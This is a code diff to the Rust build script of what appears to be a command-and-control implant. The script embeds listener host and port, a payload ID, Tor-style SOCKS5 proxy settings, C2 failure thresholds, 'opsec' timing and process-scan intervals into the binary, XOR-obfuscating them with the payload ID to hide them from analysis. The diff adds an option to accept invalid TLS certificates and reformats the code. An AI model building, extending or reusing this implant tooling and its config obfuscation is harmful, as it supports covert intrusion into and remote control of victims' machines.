@@ -1,6 +1,6 @@
 use std::env;
 use std::fs;
-use std::path::Path;
+use std::path::PathBuf;
 
 fn log_build(msg: &str) {
     println!("[BUILD] {}", msg);
@@ -18,6 +18,7 @@ fn main() {
     println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
     println!("cargo:rerun-if-env-changed=SOCKS5_HOST");
     println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
+    println!("cargo:rerun-if-env-changed=ALLOW_INVALID_CERTS");
     println!("cargo:rerun-if-env-changed=BASE_MAX_C2_FAILS");
     println!("cargo:rerun-if-env-changed=C2_THRESH_INC_FACTOR");
     println!("cargo:rerun-if-env-changed=C2_THRESH_DEC_FACTOR");
@@ -46,6 +47,10 @@ fn main() {
         .unwrap_or(false);
     let socks5_host = env::var("SOCKS5_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
     let socks5_port = env::var("SOCKS5_PORT").unwrap_or_else(|_| "9050".to_string());
+    let allow_invalid_certs = env::var("ALLOW_INVALID_CERTS")
+        .unwrap_or_else(|_| "false".to_string())
+        .parse::<bool>()
+        .unwrap_or(false);
 
     log_build(&format!("LISTENER_HOST: {}", server_host));
     log_build(&format!("LISTENER_PORT: {}", server_port));
@@ -55,22 +60,32 @@ fn main() {
     log_build(&format!("SOCKS5_ENABLED: {}", socks5_enabled));
     log_build(&format!("SOCKS5_HOST: {}", socks5_host));
     log_build(&format!("SOCKS5_PORT: {}", socks5_port));
+    log_build(&format!("ALLOW_INVALID_CERTS: {}", allow_invalid_certs));
 
     // Only use environment config if we have all required values
-    let config_content = if !server_host.is_empty() && !server_port.is_empty() && !payload_id.is_empty() {
+    let config_content = if !server_host.is_empty()
+        && !server_port.is_empty()
+        && !payload_id.is_empty()
+    {
         log_build("Using environment variables for config");
-        let base_score_bg_reduced_thresh = env::var("BASE_SCORE_THRESHOLD_BG_TO_REDUCED").unwrap_or_else(|_| "20.0".to_string());
-        let base_score_reduced_full_thresh = env::var("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL").unwrap_or_else(|_| "60.0".to_string());
+        let base_score_bg_reduced_thresh =
+            env::var("BASE_SCORE_THRESHOLD_BG_TO_REDUCED").unwrap_or_else(|_| "20.0".to_string());
+        let base_score_reduced_full_thresh =
+            env::var("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL").unwrap_or_else(|_| "60.0".to_string());
         let min_full_opsec = env::var("MIN_FULL_OPSEC_SECS").unwrap_or_else(|_| "300".to_string());
         let min_bg_opsec = env::var("MIN_BG_OPSEC_SECS").unwrap_or_else(|_| "60".to_string());
         let base_max_c2_fails = env::var("BASE_MAX_C2_FAILS").unwrap_or_else(|_| "5".to_string());
-        let min_reduced_opsec = env::var("MIN_REDUCED_OPSEC_SECS").unwrap_or_else(|_| "120".to_string());
-        let reduced_activity_sleep = env::var("REDUCED_ACTIVITY_SLEEP_SECS").unwrap_or_else(|_| "120".to_string());
+        let min_reduced_opsec =
+            env::var("MIN_REDUCED_OPSEC_SECS").unwrap_or_else(|_| "120".to_string());
+        let reduced_activity_sleep =
+            env::var("REDUCED_ACTIVITY_SLEEP_SECS").unwrap_or_else(|_| "120".to_string());
         let c2_inc_factor = env::var("C2_THRESH_INC_FACTOR").unwrap_or_else(|_| "1.1".to_string());
         let c2_dec_factor = env::var("C2_THRESH_DEC_FACTOR").unwrap_or_else(|_| "0.9".to_string());
-        let c2_adj_interval = env::var("C2_THRESH_ADJ_INTERVAL").unwrap_or_else(|_| "3600".to_string());
+        let c2_adj_interval =
+            env::var("C2_THRESH_ADJ_INTERVAL").unwrap_or_else(|_| "3600".to_string());
         let c2_max_mult = env::var("C2_THRESH_MAX_MULT").unwrap_or_else(|_| "2.0".to_string());
-        let proc_scan_interval = env::var("PROC_SCAN_INTERVAL_SECS").unwrap_or_else(|_| "300".to_string());
+        let proc_scan_interval =
+            env::var("PROC_SCAN_INTERVAL_SECS").unwrap_or_else(|_| "300".to_string());
 
         format!(
             r#"{{
@@ -82,6 +97,7 @@ fn main() {
                 "socks5_enabled": {},
                 "socks5_host": "{}",
                 "socks5_port": {},
+                "allow_invalid_certs": {},
                 "base_score_threshold_bg_to_reduced": {},
                 "base_score_threshold_reduced_to_full": {},
                 "min_duration_full_opsec_secs": {},
@@ -95,19 +111,31 @@ fn main() {
                 "c2_dynamic_threshold_max_multiplier": {},
                 "proc_scan_interval_secs": {}
             }}"#,
-            server_host, server_port, sleep_interval, payload_id, protocol,
-            socks5_enabled, socks5_host, socks5_port,
-            base_score_bg_reduced_thresh, base_score_reduced_full_thresh,
-            min_full_opsec, min_bg_opsec,
+            server_host,
+            server_port,
+            sleep_interval,
+            payload_id,
+            protocol,
+            socks5_enabled,
+            socks5_host,
+            socks5_port,
+            allow_invalid_certs,
+            base_score_bg_reduced_thresh,
+            base_score_reduced_full_thresh,
+            min_full_opsec,
+            min_bg_opsec,
             base_max_c2_fails,
             min_reduced_opsec,
             reduced_activity_sleep,
-            c2_inc_factor, c2_dec_factor, c2_adj_interval, c2_max_mult,
+            c2_inc_factor,
+            c2_dec_factor,
+            c2_adj_interval,
+            c2_max_mult,
             proc_scan_interval
         )
     } else if let Ok(content) = fs::read_to_string("config.json") {
         log_build("Using config.json file for config");
-        // We assume config.json contains the new fields if needed, 
+        // We assume config.json contains the new fields if needed,
         // otherwise serde(default) in AgentConfig will handle it.
         content
     } else {
@@ -122,6 +150,7 @@ fn main() {
             "socks5_enabled": false,
             "socks5_host": "127.0.0.1",
             "socks5_port": 9050,
+            "allow_invalid_certs": false,
             "base_score_threshold_bg_to_reduced": 20.0,
             "base_score_threshold_reduced_to_full": 60.0,
             "min_duration_full_opsec_secs": 300,
@@ -133,21 +162,30 @@ fn main() {
             "c2_failure_threshold_decrease_factor": 1.0,
             "c2_threshold_adjust_interval_secs": {},
             "c2_dynamic_threshold_max_multiplier": 1.0
-        }"#.replace("{}", &u64::MAX.to_string())
-           .to_string()
+        }"#
+        .replace("{}", &u64::MAX.to_string())
+        .to_string()
     };
 
     // Generate Rust code with the embedded config
-    let out_dir = env::var_os("OUT_DIR").unwrap();
-    let dest_path = Path::new(&out_dir).join("config.rs");
+    let out_dir: PathBuf = match env::var_os("OUT_DIR") {
+        Some(value) => value.into(),
+        None => {
+            log_build("OUT_DIR is not set; cannot write generated config");
+            return;
+        }
+    };
+    let dest_path = out_dir.join("config.rs");
     log_build(&format!("Writing embedded config to {:?}", dest_path));
-    
+
     // Use payload_id as the XOR key
     let xor_key_bytes = payload_id.as_bytes();
     if xor_key_bytes.is_empty() {
         // Fallback or error if payload_id is empty, as an empty key is bad.
         // Using a default fixed key here for safety, but ideally, an empty payload_id should be an error.
-        log_build("Warning: payload_id is empty, using a default XOR key. This is not recommended.");
+        log_build(
+            "Warning: payload_id is empty, using a default XOR key. This is not recommended.",
+        );
         // In a real scenario, you might panic here or use a securely generated random key if payload_id must be non-empty.
         // For this example, let's use a fixed non-empty key to prevent XORing with an empty slice.
         let fixed_fallback_key = "DefaultFallbackKey123";
@@ -155,7 +193,10 @@ fn main() {
         for (i, byte) in obfuscated_config_bytes.iter_mut().enumerate() {
             *byte ^= fixed_fallback_key.as_bytes()[i % fixed_fallback_key.as_bytes().len()];
         }
-        let hex_obfuscated_config = obfuscated_config_bytes.iter().map(|b| format!("{:02x}", b)).collect::<String>();
+        let hex_obfuscated_config = obfuscated_config_bytes
+            .iter()
+            .map(|b| format!("{:02x}", b))
+            .collect::<String>();
         let config_code = format!(
             r###"pub const EMBEDDED_CONFIG_HEX: &str = r#"{}"#;
             pub const EMBEDDED_CONFIG_XOR_KEY: &str = r#"{}"#; // Embed the actual key used
@@ -174,7 +215,10 @@ fn main() {
         for (i, byte) in obfuscated_config_bytes.iter_mut().enumerate() {
             *byte ^= xor_key_bytes[i % xor_key_bytes.len()];
         }
-        let hex_obfuscated_config = obfuscated_config_bytes.iter().map(|b| format!("{:02x}", b)).collect::<String>();
+        let hex_obfuscated_config = obfuscated_config_bytes
+            .iter()
+            .map(|b| format!("{:02x}", b))
+            .collect::<String>();
         let config_code = format!(
             r###"pub const EMBEDDED_CONFIG_HEX: &str = r#"{}"#;
             pub const EMBEDDED_CONFIG_XOR_KEY: &str = r#"{}"#; // Embed the payload_id as the key
